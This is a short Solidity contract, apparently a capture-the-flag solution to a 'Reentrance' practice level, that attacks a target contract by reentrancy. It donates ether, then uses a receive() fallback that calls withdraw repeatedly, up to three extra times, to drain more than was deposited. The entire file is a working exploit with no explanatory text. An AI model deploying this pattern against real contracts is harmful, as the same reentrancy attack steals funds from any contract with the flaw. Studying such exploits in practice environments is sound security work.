pragma solidity ^0.6.12;

import "../levels/Reentrance.sol";

contract Attacker_v2 {
    Reentrance public instance;
    uint256 public count;

    constructor(address payable _instance) public {
        instance = Reentrance(_instance);
    }

    function donate(uint256 _amount) public payable {
        require(msg.value == _amount, "Value must match amount");
        (bool success, ) = address(instance).call{value: _amount}(abi.encodeWithSignature("donate(address)", address(this)));
        require(success, "Donation failed");
    }

    receive() external payable {
        if (count < 3) {
            count += 1;
            instance.withdraw(1 ether);
        }
    }

    function attack() external {
        instance.withdraw(instance.balanceOf(address(this)));
    }
}
